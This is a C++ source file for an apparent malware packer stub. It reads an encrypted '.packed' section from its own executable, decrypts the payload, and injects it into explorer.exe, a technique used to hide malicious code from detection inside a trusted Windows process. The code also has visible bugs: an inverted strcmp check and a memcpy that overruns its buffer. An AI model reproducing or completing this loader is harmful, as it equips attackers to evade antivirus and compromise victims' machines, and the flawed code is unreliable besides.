/**
 * main.cpp
 */

#include <windows.h>
#include "loader.hpp"

char *get_packed_section(size_t *size) {
    char* unpacker = (char*) GetModuleHandleA(NULL);

    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)unpacker;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)((LONG_PTR)unpacker +
            dos_header->e_lfanew);
    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(nt_headers + 1);

    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        if (strcmp((char *)sections[i].Name, ".packed")) {
            *size = sections[i].SizeOfRawData;
            return unpacker + sections[i].VirtualAddress;
        }
    }

    return NULL;
}

int main(int argc, char **argv)
{
    loader_t loader;
    char *packed = get_packed_section(&loader.size);
    if (!packed) {
        return 0;
    }
    
    memcpy(loader.key, packed, KEY_SIZE);

    char *data = (char *)malloc(loader.size - KEY_SIZE);
    memcpy(data, packed+KEY_SIZE, loader.size);
    loader.bytes = data;

    loader_decrypt(&loader);
    if (!loader_inject(&loader, "c:/windows/explorer.exe")) {
        return 1;
    }

    loader_free(&loader);
    return 0;
}